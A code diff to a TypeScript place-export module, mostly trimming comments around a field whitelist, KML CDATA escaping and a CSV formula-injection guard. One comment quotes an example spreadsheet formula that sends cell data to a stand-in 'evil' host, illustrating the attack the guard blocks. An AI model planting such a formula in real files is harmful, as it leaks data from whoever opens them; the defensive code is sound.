@@ -10,7 +10,7 @@ import type { TPlace } from "./placeUtils";
 export type TExportFormat = "gpx" | "kml" | "geojson" | "csv";
 
 // The user-meaningful place fields we are willing to put in an exported file.
-// EXPORT-2: an explicit whitelist — NEVER spread the raw place record, which
+// An explicit whitelist — NEVER spread the raw place record, which
 // carries internal identifiers (ownerId, importBatchId, importKey, forkedFromId,
 // ropeWikiSnapshot, _count, …) that must not leak into files users hand to third
 // parties. These are exactly the columns of the CSV import template, so a GeoJSON
@@ -18,10 +18,9 @@ export type TExportFormat = "gpx" | "kml" | "geojson" | "csv";
 // are handled separately (name is the feature title; coords are the geometry).
 const EXPORT_PROPERTY_KEYS = ["altNames", "notes"] as const;
 
-// The seven grade keys used to be listed above. They are FIELD VALUES now and
-// leave through `placeFieldValues` with every other field the place's type
-// carries — which is also what lets a campsite export its own fields instead of
-// seven canyon columns full of nulls.
+// Grade keys leave through `placeFieldValues` with every other field the
+// place's type carries — which is also what lets a campsite export its own
+// fields instead of seven canyon columns full of nulls.
 //
 // `foreignFields` is DELIBERATELY NOT EXPORTED, and this is the one place to
 // say why: it holds another user's field labels and values, carried in on a
@@ -69,7 +68,7 @@ function escapeXml(s: string): string {
 // A `]]>` inside CDATA content ends the section early — the remainder is then
 // parsed as XML markup, so unescaped user text (notes, altNames, sources; a
 // place shared with the exporter carries the OWNER's text) can inject
-// arbitrary elements into the exported KML (FECO-009). Split the terminator
+// arbitrary elements into the exported KML. Split the terminator
 // across two adjacent CDATA sections, which XML concatenates back into the
 // literal text: the standard escape for "]]>" inside CDATA.
 function escapeCdata(s: string): string {
@@ -213,7 +212,7 @@ const CSV_COLUMNS = [
 // that a formula scanner skips past) as a formula to evaluate on open — CSV
 // injection. A place name/notes/custom-field value like
 // `=WEBSERVICE("https://evil/?d="&A1)` survives Papa.unparse's quoting
-// unmodified and executes for whoever opens the file (FECO-010; the
+// unmodified and executes for whoever opens the file (the
 // cross-user path is real — a sharee can export the owner's notes). Prefix a
 // `'` so spreadsheet apps render it as inert text; Papa.unparse still quotes
 // the cell as needed around that prefix.
@@ -222,14 +221,14 @@ const CSV_COLUMNS = [
 // numeric grade columns: those are always `String(number)` — a negative
 // coordinate ("-33.5") is a valid numeric literal spreadsheet software parses
 // as a number rather than evaluating as a formula, and prefixing it would
-// corrupt the app's own CSV round-trip (parseLatLng on re-import).
+// corrupt Logjam Web's own CSV round-trip (parseLatLng on re-import).
 function neutralizeFormula(value: string): string {
   return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
 }
 
 // Columns whose cells can carry arbitrary user-authored text (as opposed to
-// the app's own numeric formatting) — the formula-injection guard applies
-// only to these (FECO-010).
+// Logjam Web's own numeric formatting) — the formula-injection guard applies
+// only to these.
 const CSV_TEXT_COLUMNS = new Set<(typeof CSV_COLUMNS)[number]>([
   "name",
   "altNames",
@@ -269,7 +268,7 @@ function csvCell(c: TPlace, column: (typeof CSV_COLUMNS)[number]): string {
 // order. Each becomes an `attr:<key>` column the CSV importer auto-maps
 // straight back to the matching field role (see detectPlaceColumns).
 //
-// The seven grade keys arrive through here now rather than as fixed columns,
+// The seven grade keys arrive through here rather than as fixed columns,
 // which is what makes an export of campsites carry `capacity` and no grades,
 // and an export of canyons carry the grades and no `capacity`.
 function collectFieldKeys(places: TPlace[]): string[] {
@@ -299,7 +298,7 @@ function placesToCsv(places: TPlace[]): Blob {
       // Empty cell for places lacking the field; String() for present values
       // (custom-field values re-ingest as strings via the `attr:<key>` role).
       // Custom-field values are free-form user text — formula-injection guard
-      // applies here too (FECO-010).
+      // applies here too.
       const value = fieldValues[key];
       row[`attr:${key}`] =
         value == null ? "" : neutralizeFormula(String(value));
